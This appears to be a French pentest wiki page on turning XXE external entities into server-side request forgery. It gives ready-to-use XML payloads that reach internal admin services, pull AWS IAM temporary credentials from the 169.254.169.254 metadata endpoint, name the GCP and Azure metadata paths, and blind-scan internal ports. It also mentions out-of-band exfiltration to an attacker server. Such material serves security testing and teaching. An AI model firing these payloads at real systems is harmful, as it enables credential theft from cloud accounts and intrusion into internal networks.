---
title: "SSRF via les entités externes XXE"
description: "Pointer une entité SYSTEM vers des hôtes internes ou des métadonnées cloud transforme un parseur XML en une primitive de server-side request forgery."
keywords:
  - SSRF XXE
  - métadonnées cloud
  - 169.254.169.254
  - sondage de ports internes
  - server-side request forgery
---

# SSRF

Une entité externe n'a pas à nommer un chemin `file://`. Pointez-la vers une URL `http://` et le parseur XML devient un moteur de server-side request forgery : il émet la requête depuis l'intérieur du réseau cible, avec l'adresse source propre au service et la joignabilité interne que cela implique. Cela transforme le XXE en un moyen d'atteindre des hôtes, des ports et des points d'accès de métadonnées que l'attaquant ne peut pas toucher directement.

## Atteindre des services internes

Déclarez l'entité contre une URL interne et référencez-la dans un champ reflété :

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.0.10:8080/admin">
]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Le parseur récupère l'URL et, dans le cas en bande, insère le corps de la réponse dans le document là où se trouve `&xxe;`. Les panneaux d'administration, les points d'accès actuator, les files de messages et d'autres services liés à `localhost` ou à un sous-réseau interne deviennent lisibles via le parseur même quand un pare-feu les bloque de l'extérieur.

## Métadonnées cloud

La cible la plus précieuse dans les environnements cloud est le service de métadonnées d'instance à l'adresse lien-local `169.254.169.254`. Sur AWS il expose des credentials IAM temporaires :

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

La première requête renvoie le nom du rôle, et une seconde entité l'ajoute au chemin pour récupérer l'`AccessKeyId`, la `SecretAccessKey` et le `Token` :

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

Ces credentials sont utilisables contre les API du compte jusqu'à leur expiration. Des chemins équivalents existent chez d'autres fournisseurs : les métadonnées GCP sous `http://metadata.google.internal/computeMetadata/v1/` (bien qu'elles nécessitent un en-tête que de nombreux parseurs ne peuvent pas définir), et Azure sous `http://169.254.169.254/metadata/instance`. Là où l'entité ne peut pas porter l'en-tête requis, la lecture des métadonnées peut ne réussir que sur les fournisseurs qui n'en imposent pas ou sur d'anciens points d'accès de style IMDSv1.

## Sondage de ports et d'hôtes

Même quand le corps de la réponse n'est pas reflété, le comportement du parseur fuite de l'information. Pointez des entités vers une plage d'adresses et de ports internes et distinguez les résultats :

```xml
<!ENTITY xxe SYSTEM "http://10.0.0.5:22/">
```

Une connexion acceptée, refusée ou en timeout produit un message d'erreur différent, un temps de réponse différent ou un statut différent dans l'application. Un port ouvert qui parle un protocole inattendu renvoie souvent une erreur de parseur qui diffère du cas de connexion refusée, donc comparer les réponses cartographie quels hôtes sont vivants et quels ports sont ouverts à travers la plage interne. Le timing seul sépare un port filtré (long timeout) d'un port fermé (reset rapide), donnant un scan de ports internes aveugle entièrement piloté via le parseur XML.

Pour les cibles totalement aveugles, combinez cela avec le motif hors bande pour que la réponse interne récupérée soit exfiltrée vers un serveur de l'attaquant plutôt qu'inférée à partir des erreurs.

## Outils

- **Burp Suite** : pointer des entités SYSTEM vers des hôtes internes et des points d'accès de métadonnées.
- **Burp Collaborator** : confirmation de la portée du SSRF aveugle hors bande.
- **XXEinjector** : automatisation des requêtes internes pilotées par entités.

## Références

- [OWASP: Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PayloadsAllTheThings: XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
